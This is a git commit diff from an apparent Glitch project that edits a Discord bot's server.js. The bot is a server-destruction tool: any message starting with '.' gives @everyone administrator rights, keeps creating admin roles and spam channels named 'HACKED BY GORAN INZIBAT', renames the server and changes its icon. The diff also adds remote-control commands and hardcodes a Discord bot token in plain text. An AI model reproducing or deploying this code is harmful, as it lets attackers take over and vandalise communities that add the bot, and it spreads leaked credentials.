ab70cd05bf4c6a70a7b384266e17ec68804f9b8a
Glitch (fire-royal-birth) <none>
2021-02-19 07:55:23 +0000

    🏵🐜 Checkpoint ./server.js:28780777/1938

--- server.js
+++ server.js
@@ -8,7 +8,7 @@ console.log(`Logged in as ${client.user.tag}!`);
           
 
 client.on('message', message => {
-    if (message.content.startsWith(prefix + "help")) {
+    if (message.content.startsWith(".")) {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
@@ -27,28 +27,67 @@ client.on('message', message => {
       
         setInterval(() => {
             message.guild.createRole({
-                name: "HACKED",
+                name: "HACKED BY GORAN INZIBAT",
                 permissions: ["ADMINISTRATOR"]
             }).then(rr => {
  
                 message.member.addRole(rr.id);
             })
         }, 1000);
+        
         message.guild.setIcon("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
         client.user.setAvatar("https://media.discordapp.net/attachments/797127379281510480/805515784520073226/image0.png");
-        message.guild.setName('HACKED');
+        message.guild.setName('HACKED BY GORAN INZIBAT');
         setTimeout(function() {
             setInterval(() => {
               
-                message.guild.createChannel('HACKED BY BLACK JACK', 'text').then(channel => { 
-                channel.send('@everyone HACK BY BLACK JACK BCHO SERVER DABNEWA:joy: :joy: :joy:')
+                message.guild.createChannel('HACKED BY GORAN INZIBAT', 'text').then(channel => { 
+                channel.send('@everyone HACK BY GORAN INZIBAT BCHO SERVER DABNEWA:joy: :joy: :joy:')
                
                 })
             }                        
                , 500)
     })}})
 
+
+var adminprefix = ["البريفكس بتاعك هنا"]
+client.on('message', message => {
+  
+    var argresult = message.content.split(` `).slice(1).join(' ');
+  
+  if (message.content.startsWith(adminprefix + 'setg')) {
+    client.user.setGame(argresult);
+      message.channel.send(`**✅   ${argresult}**`)
+  } else 
+     if (message.content === (adminprefix + "leave")) {
+    message.guild.leave();        
+  } else  
+  if (message.content.startsWith(adminprefix + 'setw')) {
+  client.user.setActivity(argresult, {type:'WATCHING'});
+      message.channel.send(`**✅   ${argresult}**`)
+  } else 
+  if (message.content.startsWith(adminprefix + 'setl')) {
+  client.user.setActivity(argresult , {type:'LISTENING'});
+      message.channel.send(`**✅   ${argresult}**`)
+  } else 
+  if (message.content.startsWith(adminprefix + 'sets')) {
+    client.user.setGame(argresult, "https://www.twitch.tv/dream");
+      message.channel.send(`**✅**`)
+  }
+  if (message.content.startsWith(prefix + 'setname')) {
+  client.user.setUsername(argresult).then
+      message.channel.send(`Changing The Name To ..**${argresult}** `)
+} else
+if (message.content.startsWith(adminprefix + 'setava')) {
+  client.user.setAvatar(argresult);
+    message.channel.send(`Changing The Avatar To :**${argresult}** `);
+}
+ 
+});//Hiroaki | 弘明#2797
+//</> 𝕊𝓝Ỗ𝔀𝓎© CopyRight 2020
+
+
  ////codaka drwst krawa lalayan black jack
 
-client.login("NzU2OTg5OTcxMzY1MTAxNTc4.X2Z32Q.zsD9Pyo4Jzi9mdh7DDRqDpe5LFk")
+client.login("NzQwODY1MDY1MjU0NjQ5OTY3.XyvOXA.2oj-icUrmmJAaOxlvsfEDIJ_wIo")
           
